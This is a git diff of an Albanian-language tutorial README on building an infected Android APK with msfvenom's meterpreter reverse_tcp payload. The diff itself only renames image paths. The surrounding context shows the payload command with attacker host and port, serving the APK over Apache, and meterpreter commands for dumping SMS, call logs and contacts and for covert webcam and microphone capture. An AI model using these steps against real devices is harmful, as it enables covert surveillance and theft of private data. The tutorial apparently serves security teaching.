@@ -76,7 +76,7 @@ Matching Modules
 
 Payload `android/meterpreter/reverse_tcp` përdoret për pajisjet android. Meterpreter është shkurtesë për meta interpreter që është një payload i fuqishëm dhe mund të mbuloj tërë funksionalitetin e një command shell. Punon me injektim të DLL fajlla dhe qëndron tërësisht në memorje, duke mos lënë asnjë gjurmë të ekzistencës së tij në hard drive ose folder. Ka një numër komandash dhe skriptash specifike të zhvilluara për të, duke na mundësuar që në masë të madhe të realizohen qëllimet tona në pajisjen e viktimës. Reverse_tcp nënkupton që përdoret meterpreter si reverse shell që është një shell në të cilin pajisja e targetuar si viktimë, komunikon përsëri mbrapsht me pajisjen sulmuese. Pajisja sulmuese cakton një port për dëgjim në të cilin pret lidhjen me viktimën dhe përmes përdorimit të të cilit realizohet ekzekutimi i komandave pasuese.
 
-![Reverse Shell](/Foto/reverse_shell.png)
+![Reverse Shell](READMEresources/reverse_shell.png)
 
 Android Meterpreter mundëson marrjen e informatave nga folderët e sistemit, përgjimin e thirrjeve telefonike, leximin dhe dërgimin e mesazheve, leximin e log të telefonatave, përdorimin e kamerave të pajisjes, etj.
 
@@ -96,7 +96,7 @@ $ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.12 LPORT=4444 R > 
 | R                          | raw format                                                           |
 | > /root/Desktop/OurApp.apk | lokacioni ku ruhet APK aplikacioni i krijuar                         |
 
-![Krijimi i apk fajllit](Foto/krijimi_i_apk_fajllit.gif)
+![Krijimi i apk fajllit](READMEresources/krijimi_i_apk_fajllit.gif)
 
 ### Kalimi i aplikacionit të infektuar tek pajisja e targetuar
 
@@ -107,7 +107,7 @@ $ service apache2 start
 $ service apache2 status
 ```
 
-![Kalimi i aplikacionit](Foto/kalimi_i_aplikacionit.gif)
+![Kalimi i aplikacionit](READMEresources/kalimi_i_aplikacionit.gif)
 
 ### Shfrytëzimi i pajisjes së targetuar
 
@@ -150,7 +150,7 @@ Background e kalon lidhjen (sesionin) e krijuar nga payload me viktimën aktuale
 - `sessions` - shfaq listën e të gjithë sesioneve aktivë.
 - `sessions -i <numri i session>` - e merr nga prapavija sesionin e caktuar në bazë të numrit të specifikuar dhe kalon në meterpreter shell për atë sesion.
 
-![Komandat kryesore](Foto/komandat_kryesore.gif)
+![Komandat kryesore](READMEresources/komandat_kryesore.gif)
 
 ### Komandat e file sistemit
 
@@ -186,6 +186,8 @@ Stdapi: File system Commands
 
 `pwd` (print working directory) tregon lokacionin e folderit aktual në pajisjen e viktimës, ndërsa lpwd tregon lokacionin e folderit aktual në pajisjes e sulmuesit.
 
+![Komandat e fajll sistemit](READMEresources/komandat_e_fajll_sistemit.gif)
+
 #### search
 
 `search` kërkon fajlla të caktuar në tërë memorien e pajisjes së kompromentuar përderisa nuk ceket ndonjë pjesë specifike brenda folderëve.
@@ -196,8 +198,7 @@ Stdapi: File system Commands
 
 Meqë kërkimi i fajllave në tërë hapsirën memorike të pajisjes së komprementuar është i kushtueshëm në kohë dhe përdoruesi i saj mund ta vërejë mbingarkesën, sygjerohet që kur kërkohet të specifikohet një pjesë e caktuar e memories për të reduktuar kohën e kërkimit.
 
-![Komandat e fajll sistemit](Foto/komandat_e_fajll_sistemit.gif)
-![Komandat e fajll sistemit](Foto/komandat_e_fajll_sistemit2.gif)
+![Komandat e fajll sistemit](READMEresources/komandat_e_fajll_sistemit2.gif)
 
 ### Komandat e rrjetit
 
@@ -219,7 +220,7 @@ Stdapi: Networking Commands
 
 `ipconfig`
 
-![Komandat e rrjetit](Foto/komandat_e_rrjetit.gif)
+![Komandat e rrjetit](READMEresources/komandat_e_rrjetit.gif)
 
 ### Komandat e sistemit
 
@@ -251,7 +252,7 @@ Stdapi: System Commands
 
 `sysinfo`
 
-![Komandat e sistemit](Foto/komandat_e_sistemit.gif)
+![Komandat e sistemit](READMEresources/komandat_e_sistemit.gif)
 
 ### Komandat e kamerës
 
@@ -275,7 +276,7 @@ Stdapi: Webcam Commands
 - `-f` lokacioni ku ruhet audio fajlli.
 - `-p` luan automatikisht audio fajllin e inçizuar (paraprakisht është e caktuar si true)
 
-![Komanda record_mic](Foto/komanda_record_mic.gif)
+![Komanda record_mic](READMEresources/komanda_record_mic.gif)
 
 #### webcam_list
 
@@ -287,8 +288,8 @@ Stdapi: Webcam Commands
 
 - `-i` specifikon numrin identifikues të kamerës e cila përdoret.
 
-![Komanda webcam](Foto/komanda_webcam.gif)
-![Komanda webcam](Foto/komanda_webcam2.gif)
+![Komanda webcam](READMEresources/komanda_webcam.gif)
+![Komanda webcam](READMEresources/komanda_webcam2.gif)
 
 #### webcam_stream
 
@@ -296,8 +297,8 @@ Stdapi: Webcam Commands
 
 - `-i` specifikon numrin identifikues të kamerës e cila përdoret.
 
-![Komanda webcam_stream](Foto/komanda_webcam_stream.gif)
-![Komanda webcam_stream](Foto/komanda_webcam_stream2.gif)
+![Komanda webcam_stream](READMEresources/komanda_webcam_stream.gif)
+![Komanda webcam_stream](READMEresources/komanda_webcam_stream2.gif)
 
 ### Komandat e androidit
 
@@ -323,7 +324,7 @@ Android Commands
 
 `dump_calllog` nxjerr listën e të gjitha telefonatave të zhvilluara nga pajisja e komprementuar dhe e ruan atë në një tekst fajll duke specifikuar detajet e secilës thirrje.
 
-![Komandat e apndroidit](Foto/komandat_e_androidit.gif)
+![Komandat e apndroidit](READMEresources/komandat_e_androidit.gif)
 
 #### dump_contacts
 
@@ -333,7 +334,7 @@ Android Commands
 
 `dump_sms` nxjerr listë e sms-ëve të shkëmbyer nga pajisja e komprementuar dhe e ruan atë në një tekst fajll duke specifikuar detajet e secilit sms.
 
-![Komandat e android2](Foto/komandat_e_android2.gif)
+![Komandat e android2](READMEresources/komandat_e_android2.gif)
 
 #### send_sms
 
@@ -372,10 +373,10 @@ Application Controller Commands
 
 `app_run` hap një aplikacion të caktuar që është i instaluar tek pajisja e komprementuar varësisht se cilin e zgjedhim.
 
-![Komandat e aplikacioneve](Foto/komandat_e_aplikacioneve.gif)
+![Komandat e aplikacioneve](READMEresources/komandat_e_aplikacioneve.gif)
 
 #### app_unisntall
 
 `app_uninstall` shfaq dialogun për të fshirë një aplikacion të pajisjes.
 
-![Komandat e aplikacioneve2](Foto/komandat_e_aplikacioneve2.gif)
+![Komandat e aplikacioneve2](READMEresources/komandat_e_aplikacioneve2.gif)
